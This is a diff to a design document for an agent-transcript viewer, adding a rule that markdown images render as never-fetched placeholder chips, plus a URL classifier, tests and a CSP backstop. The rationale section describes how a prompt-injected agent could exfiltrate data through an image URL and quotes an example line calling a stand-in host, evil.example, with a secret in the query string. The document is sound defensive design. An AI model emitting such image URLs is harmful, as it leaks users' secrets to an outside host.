@@ -8,7 +8,9 @@ How everything in the transcript is drawn: text, tool calls, and subagent runs.
 
 - **Markdown rendering** — every transcript item's text goes through the same `Markdown`
   component with a shared compact rhythm. A bubble is reserved for user prompts only — agent
-  output (answers, tool summaries) renders unwrapped, flush-left, borderless.
+  output (answers, tool summaries) renders unwrapped, flush-left, borderless. An image in that
+  markdown is never loaded: it renders as a placeholder a click can open, because a fetch on
+  render would let a prompt-injected agent exfiltrate data just by writing an image URL.
 - **Structured tool input** — replace the raw `JSON.stringify(tool.input)` dump every transcript
   tool card used to show (both in the collapsed row's one-liner and in the expanded body) with a
   per-tool structured field list. Raw JSON stays reachable behind an explicit toggle rather than
@@ -53,7 +55,12 @@ How everything in the transcript is drawn: text, tool calls, and subagent runs.
   `isRedundant` (drops a resolved `AskUserQuestion` permission item once its tool card carries the
   same information); `Item`'s `renderNested` closure passed to `ToolGroup`
 - `web/src/components/Markdown.tsx` — shared renderer (`remarkGfm`, `rehypeColorSwatches`,
-  `rehypeFilePaths`, `rehypeHighlight`)
+  `rehypeFilePaths`, `rehypeHighlight`); its `img` component renders `MarkdownImage`, and both
+  link branches wrap their children in `MarkdownLinkContent`
+- `web/src/components/MarkdownImage.tsx` — `MarkdownImage` (the never-loaded placeholder chip),
+  `MarkdownLinkContent`
+- `web/src/lib/markdownImage.ts` — `markdownImageTarget`, `MarkdownImageTarget`: what a click on
+  the placeholder may open, decided without loading anything
 - `web/src/index.css` — `.md-body` compact spacing vars, `.md-body pre code` wrap rules,
   `.md-table-wrap` horizontal-scroll wrapper for GFM tables, `.tx-row`/`.tx-streaming`
   borderless-row and caret styling, `.tx-static` (cursor-only change for a non-expandable row),
@@ -84,6 +91,15 @@ How everything in the transcript is drawn: text, tool calls, and subagent runs.
 ## Symbols
 
 - `Markdown` — shared renderer, used by both the user bubble and unwrapped agent text
+- `MarkdownImage` — every markdown image, as a dashed placeholder chip showing the alt text and
+  where it points (the host for a URL, the path for a file) with the full address in its tooltip;
+  never an `<img>`
+- `MarkdownLinkContent` — a context wrapper on a link's children, so an image used as a link's
+  label (a README badge) renders as an inert chip inside that one link instead of a second,
+  nested anchor
+- `markdownImageTarget(src, base)` — pure classifier: `url` (http(s), absolute or
+  protocol-relative, with its host), `path` (no scheme and no `//`; query/fragment dropped,
+  percent-decoded), or `none` (empty, a bare `#fragment`, or any other scheme)
 - `.md-body` — CSS scope overriding Mantine `Typography` spacing/heading vars for a compact
   rhythm
 - `.md-body pre code` — CSS controlling code-block overflow behavior
@@ -155,6 +171,15 @@ are aligned to `user` events, which removes the turn-scoped cases.
 `remarkGfm` (tables, strikethrough, task lists, footnotes, autolink literals) + rehype plugins
 (syntax highlight, file-path links, color swatches) → rendered inside the user `Paper` bubble, or
 directly (no wrapper) for agent text.
+
+Images never become `<img>` elements. `Markdown`'s `img` component renders `MarkdownImage`, which
+asks `markdownImageTarget` what the source points at and draws a placeholder chip instead of
+fetching it. A click is a deliberate navigation, not a load: an http(s) URL opens in a new tab
+(`target="_blank"`, `rel="noopener noreferrer"`), and a file path — usually a screenshot the agent
+saved — opens the file preview, through `onLinkClick` when the host routes links itself (the
+[docs-reader](docs-reader.md)), else `openFilePreview`. A source with nothing to open (`none`), or
+an image that is itself a link's label (`MarkdownLinkContent`), renders as an inert chip. Loading
+inline on click is deliberately not offered.
 
 ### Tool cards
 
@@ -345,6 +370,11 @@ the separate durable `context-compact` event this doc's compaction handling alre
 - `server/src/sessions.context.test.ts` — `subagentParentId` recognizes a subagent message and
   returns `null` for a main-agent one; documents the gate `handleWorkerEvent` applies (the
   extractor itself is agent-agnostic).
+- `server/src/markdownImage.test.ts` — `markdownImageTarget`, run from the server's runner (the
+  only one the repo has): an http(s) image is a URL shown by its host; a protocol-relative one is
+  remote, never a path; the page's own origin gets no exemption; relative, rooted and `~` paths
+  are files, decoded with query/fragment dropped and a malformed escape kept as written; empty,
+  `mailto:` and `#fragment` sources have nothing to open.
 - `server/src/sessions.backgroundTasks.test.ts` — covers the `EPHEMERAL_SYSTEM_SUBTYPES` persist
   filter (broadcast but absent from `store.loadTranscript`, with the `compact_result` exemption and
   `task_started`/`task_notification` still landing on disk); see
@@ -354,6 +384,14 @@ the separate durable `context-compact` event this doc's compaction handling alre
 
 - User and agent text render markdown (headings, code fences, lists, GFM tables, color swatches)
   instead of plain preformatted text; single newlines collapse and raw HTML tags are dropped.
+- A markdown image is never fetched — not on render, not on click. It renders as a placeholder
+  showing its alt text and where it points (a URL's host up front, so an exfiltration attempt
+  reads as one); clicking opens an http(s) URL in a new tab with no opener or referrer, or a file
+  path in the file preview. No source is exempt: not this app's own origin (still a request nobody
+  asked for), and `data:`/`blob:` never reach the renderer, since react-markdown's default
+  `urlTransform` empties every scheme but http(s), irc(s), mailto and xmpp.
+- An image inside a link is that link's label: the link stays the one action, and the image is an
+  inert chip inside it rather than a second, nested anchor.
 - Code blocks (`.md-body pre code`) wrap long lines (`white-space: pre-wrap`,
   `overflow-wrap: anywhere`) instead of scrolling horizontally, so they stay within the
   conversation column.
@@ -496,6 +534,17 @@ the separate durable `context-compact` event this doc's compaction handling alre
   so a blanket target would not open an empty tab per footnote click. In the desktop window an
   in-place navigation to one of these has no way back (no address bar); in a browser it costs the
   user their live session tab.
+- Markdown images are placeholders because an image is fetched the moment it renders, with nobody
+  clicking anything, and this text is written by agents, collaborators and cloned READMEs: a
+  prompt-injected agent would only have to *write* `![x](https://evil.example/?q=<secret>)` for the
+  browser to deliver it. A link waits for a click, so links are left alone. The deployed CSP is
+  now enforcing, and its `img-src` admits no arbitrary host — the same channel closed one layer
+  down, for whatever gets past the renderer; see
+  [production-deployment](production-deployment.md).
+- `markdownImageTarget` is pure and lives in `web/src/lib/` with no React import, so
+  `server/src/markdownImage.test.ts` can test it from the server's runner; a protocol-relative
+  `//host/x.png` is classed through `isExternalHref` as remote, never as a local path, since the
+  browser would fetch it from `host` all the same.
 - Any `nowrap` flex row carrying free-form text needs `minWidth: 0` on the text-bearing child (or
   `flexShrink: 0` on its fixed-size sibling — badge/icon cluster), the same reasoning as the user
   bubble below applied transcript-wide: a flex child's default `min-width: auto` (min-content)
@@ -648,7 +697,10 @@ the separate durable `context-compact` event this doc's compaction handling alre
 
 ## Related decisions
 
-- [docs-reader](docs-reader.md) — the one consumer of `Markdown`'s `onLinkClick`.
+- [docs-reader](docs-reader.md) — the one consumer of `Markdown`'s `onLinkClick`, which also
+  receives a markdown image's path click.
+- [production-deployment](production-deployment.md) — the enforcing CSP whose `img-src` backs up
+  the never-load rule for markdown images.
 - [context-window](context-window.md) — the main-agent-only restriction on the fallback occupancy
   reading.
 - [session-collaboration](session-collaboration.md) — the author avatar and identity resolution
